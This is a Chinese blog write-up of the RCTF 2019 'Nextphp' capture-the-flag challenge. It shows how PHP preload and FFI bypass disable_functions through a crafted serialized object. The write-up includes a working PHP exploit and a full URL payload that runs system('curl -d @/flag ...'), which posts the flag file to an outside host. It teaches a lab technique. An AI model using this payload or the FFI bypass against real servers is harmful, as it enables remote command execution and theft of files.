---
title: '[RCTF 2019]Nextphp'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-20 15:17:10
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1114164.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201120154814.png)

代码过于简单，肯定不对劲。
可以查看phpinfo，看到disable_function里面几乎过滤了所有执行函数。

写马蚁剑也连不上。

?a=var_dump(scandir("/var/www/html/"));查看目录：
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(11) "preload.php" } 

?a=show_source('preload.php');
查看preload.php源码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201120155708.png)

然而这个反序列化我并不知道怎么利用，没有魔法函数也没有执行函数。

知识点：preload/FFI同时使用导致绕过disable_function/open_basedir
文档：https://wiki.php.net/rfc/preload
https://www.php.net/manual/en/ffi.examples-basic.php
尝试看了下，然后放弃了，原理暂时不去搞清楚，记住这个知识点就行。
题目中设置了opcache.preload = /var/www/html/preload.php和FFI support = enabled，可以利用ffi直接调用C语言编写的函数

那再看上面的代码，利用点应该就是将代码写入data里面。

exp：

<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',                          
        'arg' => 'int system(const char *command);'     //声明
    ];

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
    }
}

$a = new A();
$b = serialize($a);
echo $b;


结果：C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}

上述代码实现声明
FFI::cdef("int system(const char *command);")

所以现在只需调用即可，通过设置__serialize()['ret']的值获取flag

__serialize()['ret']->system('curl -d @/flag linux靶机的ip')

完整paylaod:
?a=$a=unserialize('C:1:"A":95:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";}}')->__serialize()['ret']->system('curl -d @/flag 172.16.191.146:8888');

传参后完整过程：
1.unserialize
把payload传给data参数,即覆盖原参数

2.run
ret=FFI::cdef('int system(const char *command);')

3.__serialize()
指定的ret内容即是最终的执行命令，通过最后的return调用，返回flag。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201121001500.png)

参考：https://www.cnblogs.com/karsa/p/13393034.html